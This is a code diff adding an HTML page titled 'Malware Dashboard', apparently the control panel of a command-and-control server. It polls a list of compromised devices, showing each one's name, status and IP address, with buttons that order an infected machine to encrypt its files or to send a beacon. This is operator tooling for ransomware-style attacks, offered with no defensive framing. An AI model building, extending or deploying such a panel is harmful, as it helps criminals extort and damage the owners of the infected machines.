@@ -1,0 +1,55 @@
+<!-- dashboard.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malware Dashboard</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { width: 80%; margin: 0 auto; }
+        .device { margin-bottom: 20px; }
+        .device h2 { margin-top: 0; }
+        .device p { margin: 5px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Malware Dashboard</h1>
+        <div id="devices"></div>
+    </div>
+
+    <script>
+        async function fetchDevices() {
+            const response = await fetch('/devices');
+            const devices = await response.json();
+            const devicesContainer = document.getElementById('devices');
+            devicesContainer.innerHTML = '';
+            devices.forEach(device => {
+                const deviceDiv = document.createElement('div');
+                deviceDiv.className = 'device';
+                deviceDiv.innerHTML = `
+                    <h2>${device.name}</h2>
+                    <p>Status: ${device.status}</p>
+                    <p>IP Address: ${device.ip}</p>
+                    <button onclick="sendCommand('${device.id}', 'encrypt')">Encrypt Files</button>
+                    <button onclick="sendCommand('${device.id}', 'beacon')">Send Beacon</button>
+                `;
+                devicesContainer.appendChild(deviceDiv);
+            });
+        }
+
+        async function sendCommand(deviceId, command) {
+            await fetch('/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, command })
+            });
+            fetchDevices();
+        }
+
+        setInterval(fetchDevices, 5000);
+        fetchDevices();
+    </script>
+</body>
+</html>
